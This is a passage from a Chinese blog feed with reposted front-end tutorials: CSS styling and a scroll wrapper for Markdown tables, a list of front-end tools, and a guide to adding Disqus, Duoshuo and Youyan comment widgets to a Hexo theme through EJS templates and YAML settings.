      <content type="html"><![CDATA[<p>　　Markdown 写的表格最终会被解析成 HTML 代码，如果使用的编辑器支持自定义 CSS，就能方便的调整样式。如果可以引入 JavaScript，样式自适应也能较好地实现。</p>
<a id="more"></a>
<p></p><p data-height="300" data-theme-id="0" data-slug-hash="ONyKqb" data-default-tab="css" data-user="MOxFIVE" class="codepen">See the Pen <a href="http://codepen.io/MOxFIVE/pen/ONyKqb/" target="_blank" rel="external">Table style</a> by MOxFIVE (<a href="http://codepen.io/MOxFIVE" target="_blank" rel="external">@MOxFIVE</a>) on <a href="http://codepen.io" target="_blank" rel="external">CodePen</a>.</p><p></p>
<script async src="//assets.codepen.io/assets/embed/ei.js"></script>

<h2 id="样式调整"><a href="#样式调整" class="headerlink" title="样式调整"></a>样式调整</h2><h3 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h3><pre><code>&lt;table&gt;: 表格
&lt;thead&gt;: table header 表头区
&lt;th&gt;: table headings 表头单元格内容
&lt;tbody&gt;: table body 表格内容区
&lt;tr&gt;: table row 表行
&lt;td&gt;: table data 单元格内容
</code></pre><h3 id="基本样式"><a href="#基本样式" class="headerlink" title="基本样式"></a>基本样式</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">table</span> &#123;</div><div class="line">    <span class="attribute">width</span>: <span class="number">100%</span>; <span class="comment">/*表格宽度*/</span></div><div class="line">    <span class="attribute">max-width</span>: <span class="number">65em</span>; <span class="comment">/*表格最大宽度，避免表格过宽*/</span></div><div class="line">    <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#dedede</span>; <span class="comment">/*表格外边框设置*/</span></div><div class="line">    <span class="attribute">margin</span>: <span class="number">15px</span> auto; <span class="comment">/*外边距*/</span></div><div class="line">    <span class="attribute">border-collapse</span>: collapse; <span class="comment">/*使用单一线条的边框*/</span></div><div class="line">    <span class="attribute">empty-cells</span>: show; <span class="comment">/*单元格无内容依旧绘制边框*/</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="selector-tag">table</span> <span class="selector-tag">th</span>,</div><div class="line"><span class="selector-tag">table</span> <span class="selector-tag">td</span> &#123;</div><div class="line">  <span class="attribute">height</span>: <span class="number">35px</span>; <span class="comment">/*统一每一行的默认高度*/</span></div><div class="line">  <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#dedede</span>; <span class="comment">/*内部边框样式*/</span></div><div class="line">  <span class="attribute">padding</span>: <span class="number">0</span> <span class="number">10px</span>; <span class="comment">/*内边距*/</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="表头样式"><a href="#表头样式" class="headerlink" title="表头样式"></a>表头样式</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">table</span> <span class="selector-tag">th</span> &#123;</div><div class="line">    <span class="attribute">font-weight</span>: bold; <span class="comment">/*加粗*/</span></div><div class="line">    <span class="attribute">text-align</span>: center <span class="meta">!important</span>; <span class="comment">/*内容居中，加上 !important 避免被 Markdown 样式覆盖*/</span></div><div class="line">    <span class="attribute">background</span>: <span class="built_in">rgba</span>(158,188,226,0.2); <span class="comment">/*背景色*/</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="隔行变色"><a href="#隔行变色" class="headerlink" title="隔行变色"></a>隔行变色</h3><ul>
<li>使用选择器选取复数行设置背景色。一般 Markdown 表格编译后都有 <code>&lt;tbody&gt;</code> 包裹内容，那下面就相当于从表格第二行开始计数</li>
</ul>
<figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">table</span> <span class="selector-tag">tbody</span> <span class="selector-tag">tr</span><span class="selector-pseudo">:nth-child(2n)</span> &#123;</div><div class="line">    <span class="attribute">background</span>: <span class="built_in">rgba</span>(158,188,226,0.12); </div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="悬浮变色"><a href="#悬浮变色" class="headerlink" title="悬浮变色"></a>悬浮变色</h3><ul>
<li>鼠标悬浮时该行改变背景色</li>
</ul>
<figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">table</span> <span class="selector-tag">tr</span><span class="selector-pseudo">:hover</span> &#123;</div><div class="line">    <span class="attribute">background</span>: <span class="number">#efefef</span>; </div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="自适应优化"><a href="#自适应优化" class="headerlink" title="自适应优化"></a>自适应优化</h2><p>表格用 Markdown 书写，编辑器解析，因而只能在已经生成好的代码上进行自适应优化。</p>
<h3 id="表头不换行"><a href="#表头不换行" class="headerlink" title="表头不换行"></a>表头不换行</h3><ul>
<li>设置表头单元格内容不换行，这样可以通过表头控制该列的最小宽度，避免浏览器窗口缩小时内容被压缩得太紧</li>
</ul>
<figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">table</span> <span class="selector-tag">th</span> &#123;</div><div class="line">    <span class="attribute">white-space</span>: nowrap; <span class="comment">/*表头内容强制在一行显示*/</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="首列不换行"><a href="#首列不换行" class="headerlink" title="首列不换行"></a>首列不换行</h3><ul>
<li>表格第一列单元格内容不换行，多数情况下表格首列不应该被压缩换行</li>
</ul>
<figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">table</span> <span class="selector-tag">td</span><span class="selector-pseudo">:nth-child(1)</span> &#123;</div><div class="line">    <span class="attribute">white-space</span>: nowrap; </div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="表格滚动条"><a href="#表格滚动条" class="headerlink" title="表格滚动条"></a>表格滚动条</h3><ul>
<li>添加 JavaScript 代码，用一个 <code>&lt;div&gt;</code> 把表格包裹起来，父元素宽度不足时显示横向滚动条，避免表格撑破布局</li>
</ul>
<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">[].slice.call(<span class="built_in">document</span>.querySelectorAll(<span class="string">'table'</span>)).forEach(<span class="function"><span class="keyword">function</span>(<span class="params">el</span>)</span>&#123;</div><div class="line">    <span class="keyword">var</span> wrapper = <span class="built_in">document</span>.createElement(<span class="string">'div'</span>);</div><div class="line">    wrapper.className = <span class="string">'table-area'</span>;</div><div class="line">    el.parentNode.insertBefore(wrapper, el);</div><div class="line">    el.parentNode.removeChild(el);</div><div class="line">    wrapper.appendChild(el);</div><div class="line">&#125;)</div></pre></td></tr></table></figure>
<ul>
<li>jQuery</li>
</ul>
<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$(<span class="string">"table"</span>).wrap(<span class="string">"&lt;div class='table-area'&gt;&lt;/div&gt;"</span>);</div></pre></td></tr></table></figure>
<ul>
<li>同时添加如下 CSS</li>
</ul>
<figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="selector-class">.table-area</span> &#123;</div><div class="line">    <span class="attribute">overflow</span>: auto;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<ul>
<li>To be added</li>
</ul>
]]></content>
      
        <categories>
            
            <category> 来自MOxFive的优秀笔记 </category>
            
            <category> 博客语言的使用 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CSS </tag>
            
            <tag> Markdown </tag>
            
            <tag> Table </tag>
            
            <tag> JavaScript </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[(再转)前端工程化工具初选]]></title>
      <url>http://yikunhaocong.com/2016/02/16/front-end-tools/</url>
      <content type="html"><![CDATA[<p>　　面对日益纷杂的前端工具，作为新人常感无从下手。经过一番检索和简单对比，再结合自己的喜好，筛选了将要学习和使用的工具，以适应日益工程化、专业化的 Web 前端开发工作。</p>
<a id="more"></a>
<h2 id="Library-amp-Framework-库与框架"><a href="#Library-amp-Framework-库与框架" class="headerlink" title="Library &amp; Framework | 库与框架"></a>Library &amp; Framework | 库与框架</h2><blockquote>
<ul>
<li><a href="http://jquery.com/" target="_blank" rel="external">jQuery</a></li>
<li><a href="http://jqueryui.com/" target="_blank" rel="external">jQuery UI</a>: A curated set of user interface interactions, effects, widgets, and themes</li>
<li><a href="http://cn.vuejs.org/" target="_blank" rel="external">Vue.js</a>: 数据驱动的组件，为现代化的 Web 界面而生</li>
<li><a href="http://facebook.github.io/react/" target="_blank" rel="external">React.js</a>: A JavaScript library for building user interfaces</li>
<li><a href="https://facebook.github.io/react-native/" target="_blank" rel="external">React Native</a>: A framework for building native apps using React</li>
</ul>
</blockquote>
<h2 id="The-Build-System-构建工具"><a href="#The-Build-System-构建工具" class="headerlink" title="The Build System | 构建工具"></a>The Build System | 构建工具</h2><p>The Build System is used to build, preview and test your project.</p>
<blockquote>
<ul>
<li><a href="http://gulpjs.com/" target="_blank" rel="external">gulp.js</a>: Automate and enhance your workflow</li>
</ul>
</blockquote>
<h2 id="The-Module-Bundler-模块打包器"><a href="#The-Module-Bundler-模块打包器" class="headerlink" title="The Module Bundler | 模块打包器"></a>The Module Bundler | 模块打包器</h2><p>Packs many modules into a few bundled assets.</p>
<blockquote>
<ul>
<li><a href="https://webpack.github.io/" target="_blank" rel="external">webpack</a>: Take modules with dependencies and generate static assets representing those modules</li>
</ul>
</blockquote>
<h2 id="The-Package-Manager-包管理"><a href="#The-Package-Manager-包管理" class="headerlink" title="The Package Manager | 包管理"></a>The Package Manager | 包管理</h2><p>The Package Manager is used for dependency management, so that you no longer have to manually download and manage your scripts.</p>
<blockquote>
<ul>
<li><a href="https://www.npmjs.com/" target="_blank" rel="external">npm</a>: Node Package Manager.</li>
</ul>
</blockquote>
<h2 id="CSS-Extension-CSS-处理"><a href="#CSS-Extension-CSS-处理" class="headerlink" title="CSS Extension | CSS 处理"></a>CSS Extension | CSS 处理</h2><p>Provide an efficient, dynamic, and expressive way to generate CSS.</p>
<blockquote>
<ul>
<li><a href="https://github.com/stylus/stylus" target="_blank" rel="external">Stylus</a>: Expressive, robust, feature-rich CSS language built for nodejs</li>
<li><a href="https://github.com/postcss/postcss" target="_blank" rel="external">PostCSS</a>: Transforming styles with JS plugins</li>
</ul>
</blockquote>
<h2 id="JavaScript-Module-JavaScript-模块化"><a href="#JavaScript-Module-JavaScript-模块化" class="headerlink" title="JavaScript Module | JavaScript 模块化"></a>JavaScript Module | JavaScript 模块化</h2><blockquote>
<ul>
<li><a href="http://exploringjs.com/es6/ch_modules.html" target="_blank" rel="external">ECMAScript 6 Module</a></li>
</ul>
</blockquote>
<h2 id="JavaScript-Template-JavaScript-模板引擎"><a href="#JavaScript-Template-JavaScript-模板引擎" class="headerlink" title="JavaScript Template | JavaScript 模板引擎"></a>JavaScript Template | JavaScript 模板引擎</h2><p>Generate HTML markup with plain JavaScript.</p>
<blockquote>
<ul>
<li><a href="http://ejs.co/" target="_blank" rel="external">EJS</a></li>
</ul>
</blockquote>
<h2 id="Test-Framework-测试框架"><a href="#Test-Framework-测试框架" class="headerlink" title="Test Framework | 测试框架"></a>Test Framework | 测试框架</h2><blockquote>
<ul>
<li><a href="http://mochajs.org/" target="_blank" rel="external">Mocha</a>: a simple, flexible, fun JavaScript test framework for node.js and the browser</li>
<li><a href="http://chaijs.com/" target="_blank" rel="external">Chai</a>: a BDD / TDD assertion library for node and the browser that can be delightfully paired with any javascript testing framework</li>
</ul>
</blockquote>
<h2 id="The-scaffolding-tool-手脚架"><a href="#The-scaffolding-tool-手脚架" class="headerlink" title="The scaffolding tool | 手脚架"></a>The scaffolding tool | 手脚架</h2><p>Scaffolds out a new application, writing your build configuration and pulling in relevant build tasks and package manager dependencies that you might need for your build.</p>
<blockquote>
<ul>
<li><a href="http://yeoman.io/" target="_blank" rel="external">Yeoman</a></li>
</ul>
</blockquote>
<h2 id="集成方案"><a href="#集成方案" class="headerlink" title="集成方案"></a>集成方案</h2><blockquote>
<ul>
<li><a href="http://fis.baidu.com/" target="_blank" rel="external">FIS</a>: 解决前端开发中自动化工具、性能优化、模块化框架、开发规范、代码部署、开发流程等问题</li>
</ul>
</blockquote>
<h2 id="Container-容器"><a href="#Container-容器" class="headerlink" title="Container | 容器"></a>Container | 容器</h2><blockquote>
<ul>
<li><a href="http://www.docker.com/" target="_blank" rel="external">Docker</a>: Build, Ship, and Run Any App, Anywhere</li>
</ul>
</blockquote>
]]></content>
      
        <categories>
            
            <category> 来自MOxFIVE的优秀笔记 </category>
            
            <category> 前端工具 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[(我又转)为 Hexo 主题添加评论模块 — Disqus, 多说, 友言]]></title>
      <url>http://yikunhaocong.com/2016/01/02/hexo-comments/</url>
      <content type="html"><![CDATA[<p></p><h2 id="intro">前言</h2>目前自己的主题 <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" rel="external">Yelee</a> 已支持使用 Disqus, 多说和友言评论，代码逻辑和配置也做了些优化，应该是比较完善了。简单分离整理一下，分享于此，方便大家添加到自己制作或使用的主题中。<p></p>
<a id="more"></a>
<h2 id="文件结构"><a href="#文件结构" class="headerlink" title="文件结构"></a>文件结构</h2><p>参考以下文件结构把复制的代码和下载的文件放到合适的位置，必要时自行修改文件引用位置。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">yelee/_config.yml</div><div class="line">-----/layout/_partial/article.ejs</div><div class="line">---------------------/comments/disqus.ejs</div><div class="line">------------------------------/duoshuo.ejs</div><div class="line">------------------------------/youyan.ejs</div></pre></td></tr></table></figure>
<h3 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h3><blockquote>
<p><a href="/resources/Hexo评论模块.zip">Hexo 评论模块（Disqus, 多说, 友言）.zip</a> by MOxFIVE</p>
</blockquote>
<h2 id="关联模块"><a href="#关联模块" class="headerlink" title="关联模块"></a>关联模块</h2><p>在合适位置添加以下代码，以便引入评论模块代码。代码使用我比较熟悉的 EJS 书写，使用 Swig, Jade 等其他模板的，请自行转换。</p>
<figure class="highlight actionscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">&lt;% <span class="keyword">if</span> (!is_home() &amp;&amp; post.comments)&#123; %&gt;</div><div class="line">    &lt;% <span class="keyword">if</span> (theme.duoshuo.on) &#123; %&gt;</div><div class="line">      &lt;%- partial(<span class="string">'comments/duoshuo'</span>, &#123;</div><div class="line">          key: post.path,</div><div class="line">          title: post.title,</div><div class="line">          url: config.url+url_for(post.path),</div><div class="line">          &#125;) %&gt;</div><div class="line">    &lt;% &#125; <span class="keyword">else</span> <span class="keyword">if</span> (theme.youyan.on) &#123; %&gt;</div><div class="line">        &lt;%- partial(<span class="string">'comments/youyan'</span>) %&gt;</div><div class="line">    &lt;% &#125; <span class="keyword">else</span> <span class="keyword">if</span> (theme.disqus.on) &#123; %&gt;</div><div class="line">        &lt;%- partial(<span class="string">'comments/disqus'</span>, &#123;</div><div class="line">            shortname: theme.disqus.shortname</div><div class="line">          &#125;) %&gt;</div><div class="line">    &lt;% &#125; <span class="keyword">else</span> <span class="keyword">if</span> (config.disqus_shortname) &#123; %&gt;</div><div class="line">        &lt;%- partial(<span class="string">'comments/disqus'</span>, &#123;</div><div class="line">            shortname: config.disqus_shortname</div><div class="line">          &#125;) %&gt;</div><div class="line">    &lt;% &#125; %&gt;</div><div class="line">&lt;% &#125; %&gt;</div></pre></td></tr></table></figure>
<h3 id="代码简析"><a href="#代码简析" class="headerlink" title="代码简析"></a>代码简析</h3><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">&lt;!--<span class="comment">//如果不是首页且没使用 `comments: false` 关闭评论，则尝试加载评论 --&gt;</span></div><div class="line">&lt;% <span class="keyword">if</span> (!is_home() &amp;&amp; post.comments)&#123; %&gt;</div><div class="line">    &lt;!--<span class="comment">//配置中启用多说时，导入相应代码 --&gt;</span></div><div class="line">    &lt;% <span class="keyword">if</span> (theme.duoshuo.on) &#123; %&gt; </div><div class="line">      &lt;!--<span class="comment">//导入duoshuo.ejs时，同时指定其中几个变量的内容。 --&gt;</span></div><div class="line">      &lt;%- partial(<span class="string">'comments/duoshuo'</span>, &#123;</div><div class="line">          key: post.path,</div><div class="line">          title: post.title,</div><div class="line">          url: config.url+url_for(post.path),</div><div class="line">          &#125;) %&gt;</div><div class="line">    &lt;!--<span class="comment">//配置中仅启用友言时，导入相应代码 --&gt;</span></div><div class="line">    &lt;% &#125; <span class="keyword">else</span> <span class="keyword">if</span> (theme.youyan.on) &#123; %&gt;</div><div class="line">        &lt;%- partial(<span class="string">'comments/youyan'</span>) %&gt;</div><div class="line">    &lt;!--<span class="comment">//配置中仅启用 Disqus 时，导入相应代码 --&gt;</span></div><div class="line">    &lt;% &#125; <span class="keyword">else</span> <span class="keyword">if</span> (theme.disqus.on) &#123; %&gt;</div><div class="line">        &lt;%- partial(<span class="string">'comments/disqus'</span>, &#123;</div><div class="line">            shortname: theme.disqus.shortname</div><div class="line">          &#125;) %&gt;</div><div class="line">    &lt;!--<span class="comment">//以上皆关闭且 Hexo 配置中设置了 disqus_shortname 时，导入相应代码 --&gt;</span></div><div class="line">    &lt;% &#125; <span class="keyword">else</span> <span class="keyword">if</span> (config.disqus_shortname) &#123; %&gt;</div><div class="line">        &lt;!--<span class="comment">//文件分离和变量的使用，使代码能较好的兼容 Hexo 主配置 --&gt;</span></div><div class="line">        &lt;%- partial(<span class="string">'comments/disqus'</span>, &#123;</div><div class="line">            shortname: config.disqus_shortname</div><div class="line">          &#125;) %&gt;</div><div class="line">    &lt;% &#125; %&gt;</div><div class="line">&lt;% &#125; %&gt;</div></pre></td></tr></table></figure>
<h3 id="新评论系统添加"><a href="#新评论系统添加" class="headerlink" title="新评论系统添加"></a>新评论系统添加</h3><ul>
<li>如果你想使用畅言或者其他社会化评论系统，并能灵活切换，请参考上文，新加一个 else if 判断引入服务商提供的代码，同时参考后文的配置添加新的设置项。</li>
</ul>
<h2 id="配置更新"><a href="#配置更新" class="headerlink" title="配置更新"></a>配置更新</h2><p>在主题中添加以下设置项进行评论功能的配置。评论设置为二级选项，因为之前不少人设置了 <code>duoshuo: true</code> ，结果都进群聊了。要启用某一个评论系统，只需去掉 on 前的 “#”，同时按照说明设置好对应个人账号信息即可。</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># &gt;&gt;&gt; Conments 评论系统 &lt;&lt;&lt;</span></div><div class="line"><span class="comment"># Chose ONE as your comment system and keep others disable.</span></div><div class="line"><span class="comment"># 选一个作为网站评论系统，其他保持禁用。</span></div><div class="line"></div><div class="line"><span class="attr">disqus:</span> </div><div class="line">  <span class="comment">#on: true</span></div><div class="line"><span class="attr">  shortname:</span> </div><div class="line">  <span class="comment"># https://help.disqus.com/customer/en/portal/articles/466208-what-s-a-shortname-</span></div><div class="line">  <span class="comment"># It is unnecessary to enable disqus here if </span></div><div class="line">  <span class="comment"># you have set "disqus_shortname" in your site's "_config.yml" </span></div><div class="line"></div><div class="line"><span class="attr">duoshuo:</span> </div><div class="line">  <span class="comment">#on: true</span></div><div class="line"><span class="attr">  domain:</span> </div><div class="line">  <span class="comment"># 是否开启多说评论，http://duoshuo.com/create-site/</span></div><div class="line">  <span class="comment"># 使用上面网址登陆你的多说，然后创建站点，在 domain 中填入你设定的域名前半部分</span></div><div class="line">  <span class="comment"># http://&lt;要填的部分&gt;.duoshuo.com (domain只填上&lt;&gt;里的内容，不要填整个网址)</span></div><div class="line"></div><div class="line"><span class="attr">youyan:</span></div><div class="line">  <span class="comment">#on: true</span></div><div class="line"><span class="attr">  id:</span> </div><div class="line">  <span class="comment"># 是否开启友言评论，http://www.uyan.cc/index.php</span></div><div class="line">  <span class="comment"># id 中填写你的友言用户数字ID，注册后进入后台管理即可查看</span></div><div class="line">  <span class="comment"># 友言服务在 Web 环境下运行，普通本地环境无法查看，请部署后在线上测试。</span></div><div class="line"></div><div class="line"><span class="comment"># &gt;&gt;&gt; &lt;&lt;&lt;</span></div></pre></td></tr></table></figure>
<h2 id="模块代码"><a href="#模块代码" class="headerlink" title="模块代码"></a>模块代码</h2><p>模块代码已附在下载文件中，在此同时列出备用。依旧是使用 EJS 编写，引入一些信息，设置了几个变量，使用其他模板引擎请自行转换。所有评论模块都设置了 <code>id=&quot;comments&quot;</code>，以便有需要时通过锚点定位跳转到评论区。</p>
<h3 id="Disqus"><a href="#Disqus" class="headerlink" title="Disqus"></a>Disqus</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">section</span> <span class="attr">id</span>=<span class="string">"comments"</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"disqus_thread"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="javascript"></span></div><div class="line">    <span class="comment">/* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */</span></div><div class="line">    <span class="keyword">var</span> disqus_shortname = <span class="string">'&lt;%= shortname%&gt;'</span>; <span class="comment">// required: replace example with your forum shortname</span></div><div class="line"></div><div class="line">    <span class="comment">/* * * DON'T EDIT BELOW THIS LINE * * */</span></div><div class="line">    (<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">      <span class="keyword">var</span> dsq = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>); dsq.type = <span class="string">'text/javascript'</span>; dsq.async = <span class="literal">true</span>;</div><div class="line">      dsq.src = <span class="string">'//'</span> + disqus_shortname + <span class="string">'.disqus.com/embed.js'</span>;</div><div class="line">      (<span class="built_in">document</span>.getElementsByTagName(<span class="string">'head'</span>)[<span class="number">0</span>] || <span class="built_in">document</span>.getElementsByTagName(<span class="string">'body'</span>)[<span class="number">0</span>]).appendChild(dsq);</div><div class="line">    &#125;)();</div><div class="line">  <span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">noscript</span>&gt;</span>Please enable JavaScript to view the <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"https://disqus.com/?ref_noscript"</span>&gt;</span>comments powered by Disqus.<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">noscript</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">section</span>&gt;</span></div></pre></td></tr></table></figure>
<h3 id="多说评论"><a href="#多说评论" class="headerlink" title="多说评论"></a>多说评论</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"duoshuo"</span> <span class="attr">id</span>=<span class="string">"comments"</span>&gt;</span></div><div class="line">    <span class="comment">&lt;!-- 多说评论框 start --&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"ds-thread"</span> <span class="attr">data-thread-key</span>=<span class="string">"&lt;%= key%&gt;"</span> <span class="attr">data-title</span>=<span class="string">"&lt;%= title%&gt;"</span> <span class="attr">data-url</span>=<span class="string">"&lt;%= url%&gt;"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">    <span class="comment">&lt;!-- 多说评论框 end --&gt;</span></div><div class="line">    <span class="comment">&lt;!-- 多说公共JS代码 start (一个网页只需插入一次) --&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="javascript"></span></div><div class="line">    <span class="keyword">var</span> duoshuoQuery = &#123;<span class="attr">short_name</span>:<span class="string">"&lt;%= theme.duoshuo.domain%&gt;"</span>&#125;;</div><div class="line">    (<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">        <span class="keyword">var</span> ds = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</div><div class="line">        ds.type = <span class="string">'text/javascript'</span>;ds.async = <span class="literal">true</span>;</div><div class="line">        ds.src = (<span class="built_in">document</span>.location.protocol == <span class="string">'https:'</span> ? <span class="string">'https:'</span> : <span class="string">'http:'</span>) + <span class="string">'//static.duoshuo.com/embed.js'</span>;</div><div class="line">        ds.charset = <span class="string">'UTF-8'</span>;</div><div class="line">        (<span class="built_in">document</span>.getElementsByTagName(<span class="string">'head'</span>)[<span class="number">0</span>] </div><div class="line">         || <span class="built_in">document</span>.getElementsByTagName(<span class="string">'body'</span>)[<span class="number">0</span>]).appendChild(ds);</div><div class="line">    &#125;)();</div><div class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line">    <span class="comment">&lt;!-- 多说公共JS代码 end --&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div></pre></td></tr></table></figure>
<h3 id="友言评论"><a href="#友言评论" class="headerlink" title="友言评论"></a>友言评论</h3><figure class="highlight erb"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="xml"><span class="tag">&lt;<span class="name">section</span> <span class="attr">class</span>=<span class="string">"youyan"</span> <span class="attr">id</span>=<span class="string">"comments"</span>&gt;</span></span></div><div class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"uyan_frame"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://v2.uyan.cc/code/uyan.js?uid=&lt;%=</span></span> theme.youyan.id<span class="xml"><span class="tag"><span class="string">%&gt;"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></div><div class="line"><span class="tag">&lt;/<span class="name">section</span>&gt;</span></div></pre></td></tr></table></figure>
<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><ol>
<li><strong>多说评论</strong>: <a href="http://duoshuo.com/" target="_blank" rel="external">http://duoshuo.com/</a></li>
<li><strong>友言评论</strong>: <a href="http://www.uyan.cc/" target="_blank" rel="external">http://www.uyan.cc/</a></li>
<li><strong>Disqus</strong>: <a href="https://disqus.com/" target="_blank" rel="external">https://disqus.com/</a></li>
<li><strong><em>refactor: comments code &amp; configuration 评论模块优化</em></strong> by <strong>MOxFIVE</strong> on <code>2016/01/01</code>: <a href="https://github.com/MOxFIVE/hexo-theme-yelee/commit/3138ca36bd209fd9f79b60fbb6b15b44673560b5" target="_blank" rel="external">https://github.com/MOxFIVE/hexo-theme-yelee/commit/3138ca36bd209fd9f79b60fbb6b15b44673560b5</a></li>
